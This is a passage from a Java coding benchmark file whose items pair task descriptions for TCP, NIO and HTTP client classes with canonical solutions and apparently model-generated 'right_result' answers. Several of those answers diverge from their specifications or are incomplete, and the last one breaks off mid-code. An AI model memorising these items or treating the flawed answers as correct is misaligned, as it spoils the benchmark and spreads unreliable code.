    "right_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport javax.sound.sampled.AudioFormat;\n\npublic class VoiceClient extends Thread {\n    private AudioFormat format;\n    private VoiceOutput outputThread;\n    private VoiceInput inputThread;\n    private DataOutputStream output;\n    private DataInputStream input;\n    private boolean running;\n    private Socket socket;\n    private String ip;\n\n    public VoiceClient(String ip) {\n        this.ip = ip;\n        this.running = false;\n    }\n\n    @Override\n    public void run() {\n        try {\n            socket = new Socket(ip, 12345);\n            output = new DataOutputStream(socket.getOutputStream());\n            input = new DataInputStream(socket.getInputStream());\n            format = new AudioFormat(8000, 16, 1, true, false);\n            outputThread = new VoiceOutput(output, format);\n            inputThread = new VoiceInput(input, format);\n            outputThread.start();\n            inputThread.start();\n            running = true;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void disconnect() {\n        try {\n            running = false;\n            outputThread.interrupt();\n            inputThread.interrupt();\n            output.close();\n            input.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean isRunning() {\n        return running;\n    }\n\n    public DataOutputStream getOutputStream() {\n        return output;\n    }\n\n    public DataInputStream getInputStream() {\n        return input;\n    }\n\n    public AudioFormat getAudioFormat() {\n        return format;\n    }\n}\n```"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends a message, and properly handles the connection lifecycle including cleanup.\n\nClass Description: The TCPClient class encapsulates functionality for creating a TCP client that connects to a specified server, sends a UTF-8 encoded message, and manages socket resources. It handles potential network exceptions and ensures proper resource cleanup.\n\nAttributes:\n- s: Socket - The socket object used for the TCP connection\n- dos: DataOutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(): void - Establishes a connection to the server at 127.0.0.1:5555, sends the message \"Happy\" after a 3-second delay, and handles connection cleanup. No parameters. No return value.",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPClient {\n\n    public void connect() {\n        Socket s = null;\n        DataOutputStream dos = null;\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            System.out.println(\"Yeah, I connected\");\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n            dos.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) {\n                    dos.close();\n                }\n                if (s != null) {\n                    s.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\n\npublic class TCPClient {\n    private Socket s;\n    private DataOutputStream dos;\n\n    public void connect() {\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) dos.close();\n                if (s != null) s.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        TCPClient client = new TCPClient();\n        client.connect();\n    }\n}\n```"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The SocketClient class provides functionality for establishing a TCP connection to a server, sending messages, receiving responses, and managing connection resources. It encapsulates the socket communication logic using Java's IO and networking classes.\n\nAttributes:\n- theSocket: Socket - The socket object representing the connection to the server\n- out: PrintWriter - The output stream writer for sending data to the server\n- networkIn: BufferedReader - The input stream reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendMessage(String message) -> void - Sends a message to the connected server. The message is automatically flushed.\n- readResponse() -> String - Reads a line of response from the server. Throws IOException if reading fails.\n- close() -> void - Closes all connection resources (socket, input and output streams) safely. Handles any IOExceptions internally.",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class SocketClient {\n\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n        out = new PrintWriter(theSocket.getOutputStream());\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n        out.flush();\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketClient {\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        out = new PrintWriter(theSocket.getOutputStream(), true);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a Java function that establishes a TCP client connection to a server, sends HTTP upgrade requests and echo messages, and verifies server responses.\n\nFunction Description: The function connects to a predefined server using TCP, sends an HTTP upgrade request followed by echo messages, and asserts the correctness of server responses. It handles basic client-server communication including connection establishment, data exchange, and connection termination.\n\nInput: \n- url: String - The URL path to be used in the HTTP GET request\n\nOutput: \n- None (void) - The function performs assertions to verify server responses but doesn't return any value. It throws IOException if any network communication fails.\n\nNote: The function uses predefined host address and port from DefaultServer class, and includes a helper method readBytes() (not shown) to read data from the input stream.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic void runTest(final String url) throws IOException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET \" + url + \" HTTP/1.1\\r\\nHost:default\\r\\nConnection: upgrade\\r\\nUpgrade: servlet\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    Assert.assertTrue(readBytes(in).startsWith(\"HTTP/1.1 101 Switching Protocols\\r\\n\"));\n\n    out.write(\"Echo Messages\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"Echo Messages2\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    Assert.assertEquals(\"Echo Messages2\\r\\n\\r\\n\", readBytes(in));\n\n    out.write(\"exit\\r\\n\\r\\n\".getBytes());\n    out.flush();\n    out.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpClient {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(DefaultServer.HOST, DefaultServer.PORT);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send HTTP upgrade request\n            out.println(\"GET \" + args[0] + \" HTTP/1.1\");\n            out.println(\"Host: \" + DefaultServer.HOST);\n            out.println(\"Upgrade: websocket\");\n            out.println(\"Connection: Upgrade\");\n            out.println();\n\n            // Read response\n            String responseLine;\n            while ((responseLine = in.readLine()) != null && !responseLine.isEmpty()) {\n                System.out.println(responseLine);\n            }\n\n            // Send echo message\n            out.println(\"Hello, Server!\");\n\n            // Read echo response\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(\"Echo: \" + responseLine);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java's Socket API for establishing connections, sending and receiving data, and managing the connection state.\n\nClass Description: The SocketClient class is a singleton implementation that provides TCP client functionality. It manages a single socket connection, handles data transmission through input/output streams, and maintains connection state. The class includes methods for opening/closing connections, reading/writing data, and checking connection status.\n\nAttributes:\n- socketClient: [SocketClient] - Singleton instance of the class\n- socket: [Socket] - The TCP socket connection\n- outputStream: [OutputStream] - Output stream for sending data\n- inputStream: [InputStream] - Input stream for receiving data\n- isConnected: [boolean] - Connection status flag\n- DEFAULT_READ_BUFFER_SIZE: [int] - Default buffer size for reading data (32KB)\n- buffer: [byte[]] - Temporary buffer for reading data\n- receivedData: [byte[]] - Storage for received data\n\nMethods:\n- getInstance() -> [SocketClient] - Returns the singleton instance of SocketClient\n- openConnection(String ip, int port) -> [void] - Opens a connection to the specified IP and port\n- isConnected() -> [boolean] - Returns the current connection status\n- write(byte[] data) -> [void] - Synchronously writes data to the output stream\n- read(int bytesToBeRead) -> [int] - Synchronously reads specified number of bytes from input stream\n- getReceivedData() -> [byte[]] - Returns the last received data\n- closeConnection() -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SocketClient {\n\n    private static SocketClient socketClient = null;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected = false;\n    public static final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        if (!socket.isConnected()) {\n            isConnected = false;\n            return;\n        }\n        isConnected = true;\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n    }\n\n    public static SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public synchronized void write(byte[] data) throws IOException {\n        if (isConnected && socketClient.isConnected && outputStream != null) {\n            outputStream.write(data);\n        }\n    }\n\n    public synchronized int read(int bytesToBeRead) throws IOException {\n        int numBytesRead = 0;\n        int readNow;\n        int bytesToBeReadTemp = bytesToBeRead;\n        receivedData = new byte[DEFAULT_READ_BUFFER_SIZE];\n        while (numBytesRead < bytesToBeRead) {\n            readNow = inputStream.read(buffer, 0, bytesToBeReadTemp);\n            if (readNow <= 0) {\n                return numBytesRead;\n            } else {\n                System.arraycopy(buffer, 0, receivedData, numBytesRead, readNow);\n                numBytesRead += readNow;\n                bytesToBeReadTemp -= readNow;\n            }\n        }\n        return numBytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        try {\n            if (isConnected) {\n                inputStream.close();\n                outputStream.close();\n                socket.close();\n                isConnected = false;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketClient {\n    private static SocketClient socketClient;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected;\n    private final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {}\n\n    public static synchronized SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        isConnected = true;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public void write(byte[] data) throws IOException {\n        outputStream.write(data);\n        outputStream.flush();\n    }\n\n    public int read(int bytesToBeRead) throws IOException {\n        int bytesRead = inputStream.read(buffer, 0, bytesToBeRead);\n        if (bytesRead > 0) {\n            receivedData = new byte[bytesRead];\n            System.arraycopy(buffer, 0, receivedData, 0, bytesRead);\n        } else {\n            receivedData = new byte[0];\n        }\n        return bytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() throws IOException {\n        if (outputStream != null) {\n            outputStream.close();\n        }\n        if (inputStream != null) {\n            inputStream.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n        isConnected = false;\n    }\n}\n```"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a Java class that provides TCP client functionality using Java NIO (Non-blocking I/O) for efficient network communication. The class should support both plaintext and SSL connections, manage multiple connections, and handle connection lifecycle operations.\n\nClass Description: The NioTcpClient class is a non-blocking TCP client implementation using Java NIO. It manages multiple socket connections, handles connection establishment, and provides methods for connection management. It supports both plaintext and SSL connections through a configurable transmission mechanism.\n\nAttributes:\n- nioSelector: Selector - The NIO selector used for managing multiple channels\n- keyMap: Map<String, SelectionKey> - Maps connection IDs to their corresponding selection keys\n- time: Time - Provides time-related functionality\n- sslFactory: SSLFactory - Handles SSL-related operations if SSL connections are used\n- networkConfig: NetworkConfig - Contains network configuration parameters\n\nMethods:\n- NioTcpClient(Time, SSLFactory, NetworkConfig) -> NioTcpClient - Constructor that initializes the selector, time, SSL factory, and network configuration\n- connect(InetSocketAddress, int, int, PortType) -> String - Establishes a new connection to the specified address with given buffer sizes and port type, returns a connection ID\n- generateConnectionId(SocketChannel) -> String - Generates a unique connection ID based on local and remote socket addresses\n- createTransmission(String, SelectionKey, String, int, PortType, SSLFactory.Mode) -> Transmission - Creates an appropriate transmission object (plaintext or SSL) for the connection\n- disconnect(String) -> void - Disconnects the connection with the specified ID\n- close() -> void - Closes all connections and releases all resources",
    "Canonical_solution": "import com.github.ambry.network.NetworkSend;\nimport com.github.ambry.network.NetworkReceive;\nimport com.github.ambry.network.PortType;\nimport com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.config.NetworkConfig;\nimport com.github.ambry.utils.Time;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n\n  private final java.nio.channels.Selector nioSelector;\n  private final Map<String, SelectionKey> keyMap;\n  private final Time time;\n  private final SSLFactory sslFactory;\n  private final NetworkConfig networkConfig;\n\n  public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = java.nio.channels.Selector.open();\n    this.time = time;\n    this.keyMap = new HashMap<>();\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n  }\n\n  public String connect(InetSocketAddress address, int sendBufferSize, int receiveBufferSize, PortType portType)\n      throws IOException {\n    SocketChannel channel = SocketChannel.open();\n    channel.configureBlocking(false);\n    channel.socket().setKeepAlive(true);\n    channel.socket().setSendBufferSize(sendBufferSize);\n    channel.socket().setReceiveBufferSize(receiveBufferSize);\n    channel.socket().setTcpNoDelay(true);\n    try {\n      channel.connect(address);\n    } catch (IOException e) {\n      channel.close();\n      throw e;\n    }\n    String connectionId = generateConnectionId(channel);\n    SelectionKey key = channel.register(this.nioSelector, SelectionKey.OP_CONNECT);\n    Transmission transmission = createTransmission(connectionId, key, address.getHostName(), address.getPort(), portType,\n        SSLFactory.Mode.CLIENT);\n    key.attach(transmission);\n    this.keyMap.put(connectionId, key);\n    return connectionId;\n  }\n\n  private String generateConnectionId(SocketChannel channel) {\n    return channel.socket().getLocalAddress().getHostAddress() + \":\" + channel.socket().getLocalPort() + \"-\" +\n        channel.socket().getInetAddress().getHostAddress() + \":\" + channel.socket().getPort();\n  }\n\n  protected Transmission createTransmission(String connectionId, SelectionKey key, String hostname, int port,\n      PortType portType, SSLFactory.Mode mode) throws IOException {\n    if (portType == PortType.PLAINTEXT) {\n      return new PlainTextTransmission(connectionId, (SocketChannel) key.channel(), key, time, null, networkConfig);\n    } else if (portType == PortType.SSL) {\n      return new SSLTransmission(sslFactory, connectionId, (SocketChannel) key.channel(), key, hostname, port, time,\n          null, mode, networkConfig);\n    } else {\n      throw new IllegalArgumentException(\"Unsupported portType \" + portType);\n    }\n  }\n\n  public void disconnect(String connectionId) {\n    SelectionKey key = this.keyMap.get(connectionId);\n    if (key != null) {\n      key.cancel();\n    }\n  }\n\n  public void close() throws IOException {\n    for (SelectionKey key : this.nioSelector.keys()) {\n      Transmission transmission = (Transmission) key.attachment();\n      if (transmission != null) {\n        transmission.close();\n      }\n      key.channel().close();\n    }\n    this.nioSelector.close();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n    private final Selector nioSelector;\n    private final Map<String, SelectionKey> keyMap = new HashMap<>();\n    private final Time time;\n    private final SSLFactory sslFactory;\n    private final NetworkConfig networkConfig;\n\n    public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n        this.time = time;\n        this.sslFactory = sslFactory;\n        this.networkConfig = networkConfig;\n        this.nioSelector = Selector.open();\n    }\n\n    public String connect(InetSocketAddress address, int readBufferSize, int writeBufferSize, PortType portType) throws IOException {\n        SocketChannel channel = SocketChannel.open(address);\n        channel.configureBlocking(false);\n        channel.socket().setReceiveBufferSize(readBufferSize);\n        channel.socket().setSendBufferSize(writeBufferSize);\n\n        String connectionId = generateConnectionId(channel);\n        channel.register(nioSelector, SelectionKey.OP_CONNECT, connectionId);\n\n        return connectionId;\n    }\n\n    private String generateConnectionId(SocketChannel channel) {\n        return channel.getLocalAddress() + \":\" + channel.getRemoteAddress();\n    }\n\n    private Transmission createTransmission(String connectionId, SelectionKey key, String data, int bufferSize, PortType portType, SSLFactory.Mode mode) {\n        if (mode == SSLFactory.Mode.SSL) {\n            return new SslTransmission(connectionId, key, data, bufferSize, portType, sslFactory);\n        } else {\n            return new PlainTextTransmission(connectionId, key, data, bufferSize, portType);\n        }\n    }\n\n    public void disconnect(String connectionId) {\n        SelectionKey key = keyMap.get(connectionId);\n        if (key != null) {\n            key.cancel();\n            try {\n                key.channel().close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            keyMap.remove(connectionId);\n        }\n    }\n\n    public void close() throws IOException {\n        for (SelectionKey key : keyMap.values()) {\n            key.cancel();\n            key.channel().close();\n        }\n        keyMap.clear();\n        nioSelector.close();\n    }\n}\n```"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for interacting with a hub API, handling authentication, and processing various API responses to retrieve encryption keys.\n\nClass Description: The HubHttpClient class provides functionality to communicate with a hub API, manage authentication using bearer tokens, and handle different API response scenarios to retrieve encryption keys. It supports both modern and legacy API versions.\n\nAttributes:\n\nhttpClient: [HttpClient] - The HTTP client instance used for making requests\nbearerToken: [String] - The bearer token used for authentication\nhubConfig: [HubConfig] - Configuration containing API URIs\ndeviceId: [String] - Identifier for the device making requests\nvaultId: [String] - Identifier for the vault being accessed\n\nMethods:\n\nconstructor: [HubHttpClient]([ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId]) -> [void] - Initializes the HTTP client with configuration and authentication details\nrequestApiConfig: [requestApiConfig]() -> [CompletableFuture<ReceivedKey>] - Initiates the API configuration request chain\nhandleApiConfigResponse: [handleApiConfigResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the API configuration response\nrequestDeviceData: [requestDeviceData]() -> [CompletableFuture<ReceivedKey>] - Requests device-specific data from the API\nhandleDeviceDataResponse: [handleDeviceDataResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the device data response\nrequestVaultMasterkey: [requestVaultMasterkey]([String encryptedUserKey]) -> [CompletableFuture<ReceivedKey>] - Requests the vault master key\nhandleVaultMasterkeyResponse: [handleVaultMasterkeyResponse]([String encryptedUserKey, HttpResponse<String> response]) -> [ReceivedKey] - Processes the vault master key response\nrequestLegacyAccessToken: [requestLegacyAccessToken]() -> [CompletableFuture<ReceivedKey>] - Requests a legacy access token\nhandleLegacyAccessTokenResponse: [handleLegacyAccessTokenResponse]([HttpResponse<String> response]) -> [ReceivedKey] - Processes the legacy access token response\nretrievalFailed: [retrievalFailed]([Throwable cause]) -> [ReceivedKey] - Handles request failures",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Preconditions;\nimport com.nimbusds.jose.JWEObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.text.ParseException;\nimport java.time.Duration;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(HubHttpClient.class);\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final Duration REQ_TIMEOUT = Duration.ofSeconds(10);\n\n\tprivate final HttpClient httpClient;\n\tprivate final String bearerToken;\n\tprivate final HubConfig hubConfig;\n\tprivate final String deviceId;\n\tprivate final String vaultId;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken);\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.vaultId = vaultId;\n\t}\n\n\tpublic CompletableFuture<ReceivedKey> requestApiConfig() {\n\t\tvar configUri = hubConfig.URIs.API.resolve(\"config\");\n\t\tvar request = HttpRequest.newBuilder(configUri)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenCompose(this::handleApiConfigResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tPreconditions.checkState(response.statusCode() == 200, \"Unexpected response \" + response.statusCode());\n\t\ttry {\n\t\t\tvar config = JSON.reader().readValue(response.body(), ConfigDto.class);\n\t\t\tif (config.apiLevel >= 1) {\n\t\t\t\treturn requestDeviceData();\n\t\t\t} else {\n\t\t\t\treturn requestLegacyAccessToken();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestDeviceData() {\n\t\tvar deviceUri = hubConfig.URIs.API.resolve(\"devices/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8))\n\t\t\t\t.thenCompose(this::handleDeviceDataResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\ttry {\n\t\t\tswitch (response.statusCode()) {\n\t\t\t\tcase 200 -> {\n\t\t\t\t\tvar device = JSON.reader().readValue(response.body(), DeviceDto.class);\n\t\t\t\t\treturn requestVaultMasterkey(device.userPrivateKey);\n\t\t\t\t}\n\t\t\t\tdefault -> throw new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n\t\tvar vaultKeyUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/access-token\");\n\t\tvar request = HttpRequest.newBuilder(vaultKeyUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response))\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tif (response.statusCode() == 200) {\n\t\t\ttry {\n\t\t\t\tvar vaultKeyJwe = JWEObject.parse(response.body());\n\t\t\t\tvar userKeyJwe = JWEObject.parse(encryptedUserKey);\n\t\t\t\treturn ReceivedKey.vaultKeyAndUserKey(vaultKeyJwe, userKeyJwe);\n\t\t\t} catch (ParseException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n\t\tvar legacyAccessTokenUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/keys/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(legacyAccessTokenUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(this::handleLegacyAccessTokenResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n\t\ttry {\n\t\t\tif (response.statusCode() == 200) {\n\t\t\t\tvar token = JWEObject.parse(response.body());\n\t\t\t\treturn ReceivedKey.legacyDeviceKey(token);\n\t\t\t} else {\n\t\t\t\tthrow new IOException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException | ParseException e) {\n\t\t\tthrow new UncheckedIOException(e instanceof IOException ? (IOException) e : new IOException(e));\n\t\t}\n\t}\n\n\tprivate ReceivedKey retrievalFailed(Throwable cause) {\n\t\tthrow new RuntimeException(cause);\n\t}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record DeviceDto(@JsonProperty(value = \"userPrivateKey\", required = true) String userPrivateKey) {}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record ConfigDto(@JsonProperty(value = \"apiLevel\") int apiLevel) {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n    private final HttpClient httpClient;\n    private final String bearerToken;\n    private final HubConfig hubConfig;\n    private final String deviceId;\n    private final String vaultId;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n        this.httpClient = HttpClient.newBuilder().executor(executor).build();\n        this.bearerToken = bearerToken;\n        this.hubConfig = hubConfig;\n        this.deviceId = deviceId;\n        this.vaultId = vaultId;\n    }\n\n    public CompletableFuture<ReceivedKey> requestApiConfig() {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(hubConfig.getApiUri())\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenCompose(this::handleApiConfigResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n        // Process API config response and return CompletableFuture<ReceivedKey>\n    }\n\n    public CompletableFuture<ReceivedKey> requestDeviceData() {\n        HttpRequest request = HttpRequest.newBuilder()\n                